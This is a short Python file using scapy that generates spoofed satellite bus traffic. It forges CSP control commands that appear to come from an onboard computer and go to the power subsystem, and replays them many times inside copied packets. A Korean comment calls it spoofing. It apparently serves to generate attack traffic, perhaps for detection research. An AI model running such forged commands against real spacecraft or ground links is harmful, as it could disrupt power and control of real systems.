from scapy.all import Raw, UDP, IP
from .csp import CSP

def generate_spoofing(original_pkt, base_time, ccsds_header, multiplier):
    attack_packets = []
    # 위장 타겟: OBC(1)에서 EPS(2)로 보내는 제어 명령 스푸핑
    attack_csp = CSP(priority=1, source=1, destination=2, dst_port=5, src_port=5)
    attack_data = b"\xFF\xFF\xFF\xFF" 
    new_payload = ccsds_header + bytes(attack_csp) + attack_data

    for i in range(multiplier):
        attack_pkt = original_pkt.copy()
        attack_pkt.time = base_time + (i * 0.001)
        attack_pkt[UDP].payload = Raw(load=new_payload)
        
        del attack_pkt[UDP].len
        del attack_pkt[UDP].chksum
        if attack_pkt.haslayer(IP):
            del attack_pkt[IP].len
            del attack_pkt[IP].chksum
            
        attack_packets.append(attack_pkt)
        
    return attack_packets
